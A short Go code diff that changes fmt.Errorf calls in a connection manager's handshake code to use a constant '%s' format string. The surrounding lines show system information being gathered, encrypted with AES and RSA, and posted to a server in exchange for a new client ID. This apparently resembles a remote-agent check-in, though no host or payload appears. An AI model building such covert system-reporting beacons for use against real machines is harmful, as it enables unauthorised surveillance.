@@ -53,13 +53,13 @@ func (hm *ConnMgr) performHandshake() error {
 	// Step 1: Collect fresh system info with new seed
 	sysInfoReport, err := collectSystemInfo(hm.initialClientID) // Use initial client ID
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E19, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
 	}
 
 	// Step 2: Convert to JSON
 	jsonOutput, err := sysInfoReport.toJSON()
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E18, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 	}
 
 	// Step 3: Double encrypt the JSON (AES + RSA)
@@ -69,7 +69,7 @@ func (hm *ConnMgr) performHandshake() error {
 		hm.decryptedValues.PublicKey,
 	)
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E19, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
 	}
 
 	// Step 4: Build POST URL with initial clientID
@@ -88,7 +88,7 @@ func (hm *ConnMgr) performHandshake() error {
 	// Step 5: Send handshake and get new client ID
 	newClientID, err := sendInitialPost(postURL, encryptedJSON, hm.decryptedValues)
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E12, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E12, err.Error()))
 	}
 
 
@@ -153,7 +153,7 @@ func (hm *ConnMgr) refreshHandshake() error {
 		// On error, ensure we restore old client ID
 		hm.currentClientID = oldClientID
 		setClientID(oldClientID)
-		return fmt.Errorf(ErrCtx(E12, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E12, err.Error()))
 	}
 
 	return nil
